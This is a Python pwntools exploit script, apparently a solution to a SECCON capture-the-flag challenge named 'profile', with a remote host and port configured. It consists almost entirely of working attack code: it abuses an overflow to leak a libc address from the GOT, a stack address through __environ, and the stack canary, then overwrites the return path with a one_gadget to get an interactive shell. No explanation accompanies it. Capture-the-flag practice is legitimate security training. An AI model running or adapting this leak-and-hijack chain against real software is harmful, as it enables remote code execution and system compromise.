#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import os
import sys

elfPath = "./profile"
libcPath = "./libc-2.23.so"
remoteAddr = "profile.pwn.seccon.jp"
remotePort = 28553

context.binary = elfPath
elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc
    libc.sym['one_gadget'] = 0x45216

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

    libc.sym['one_gadget'] = 0x45216

context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG():
    info("update -> {:#x}".format(0x40110A))
    info("show -> {:#x}".format(0x4011A1))
    raw_input("DEBUG: ")

def update(msg):
    io.sendlineafter(">> ", "1")
    io.sendlineafter("message >> ", msg)

def show():
    io.sendlineafter(">> ", "2")


if __name__ == "__main__":
    io.sendlineafter("Name >> ", 'm4x')
    io.sendlineafter("Age >> ", "21")
    io.sendlineafter("Message >> ", "msg")

    update(flat(cyclic(16), elf.got['getchar'], '\x08'))
    show()
    io.recvuntil("Name : ")
    libc.address = u64(io.recvn(6) + '\0\0') - libc.sym['getchar']
    success("libc", libc.address)
    
    update(flat(cyclic(16), libc.sym['__environ'], '\x08'))
    show()
    io.recvuntil("Name : ")
    stack = u64(io.recvn(8))
    success("stack", stack)

    update(flat(cyclic(16), stack - 0x110, '\x08'))
    show()
    io.recvuntil("Name : ")
    canary = u64(io.recvn(8))
    success("canary", canary)

    #  DEBUG()
    update(flat(cyclic(16), stack - 0x128, 8, '00000000', 0, 0x15, canary, stack - 0x18, 0, libc.sym['one_gadget'], libc.sym['one_gadget']))
    io.sendlineafter(">> ", "0")
    
    io.interactive()
